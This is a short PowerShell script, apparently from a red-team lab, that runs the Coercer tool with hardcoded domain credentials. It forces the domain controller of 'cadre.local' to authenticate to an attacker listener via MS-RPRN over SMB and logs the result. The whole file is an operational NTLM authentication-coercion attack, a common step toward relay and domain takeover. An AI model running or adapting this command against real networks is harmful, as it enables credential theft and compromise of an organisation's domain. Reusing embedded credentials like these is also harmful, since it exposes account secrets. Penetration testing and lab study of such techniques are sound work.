# Run coercer MS-RPRN and capture full traceback to a file
$ErrorActionPreference = "Continue"
$out = "C:\Tools\cadre-attack\coercer-run.log"
& "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" coerce -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 -t 192.168.77.10 -l 192.168.77.62 --filter-protocol-name MS-RPRN --auth-type smb 2>&1 | Out-File -FilePath $out -Encoding UTF8 -Force
Write-Output "rc=$LASTEXITCODE"
Get-Content $out
